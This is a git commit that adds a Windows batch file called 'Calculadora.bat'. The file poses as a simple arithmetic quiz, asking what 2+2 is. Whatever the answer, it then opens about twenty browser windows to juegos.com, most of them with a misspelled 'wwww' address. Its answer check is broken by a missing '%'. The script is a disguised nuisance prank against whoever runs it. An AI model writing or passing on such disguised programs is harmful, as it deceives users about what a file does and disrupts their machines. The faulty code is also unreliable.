e0a47d78e686688fdff1fa01bb87a244cd1b2ce0
adrirom28 <80050894+adrirom28@users.noreply.github.com>
2021-03-04 08:51:19 -0600

    Add files via upload

---
+++ Calculadora.bat
@@ -0,0 +1,29 @@
+@echo off
+
+
+echo.
+set/P suma= cuanto es 2+2 
+echo.
+if suma%==4 echo Respuesta correcta!
+start http://www.juegos.com/user/
+start http://wwww.juegos.com/user/
+start http://wwww.juegos.com/user/
+start http://wwww.juegos.com/user/
+start http://wwww.juegos.com/user/
+start http://www.juegos.com/user/
+start http://wwww.juegos.com/user/
+start http://wwww.juegos.com/user/
+start http://wwww.juegos.com/user/
+start http://wwww.juegos.com/user/
+start http://www.juegos.com/user/
+start http://wwww.juegos.com/user/
+start http://wwww.juegos.com/user/
+start http://wwww.juegos.com/user/
+start http://wwww.juegos.com/user/
+start http://www.juegos.com/user/
+start http://wwww.juegos.com/user/
+start http://wwww.juegos.com/user/
+start http://wwww.juegos.com/user/
+start http://wwww.juegos.com/user/
+pause
+exit
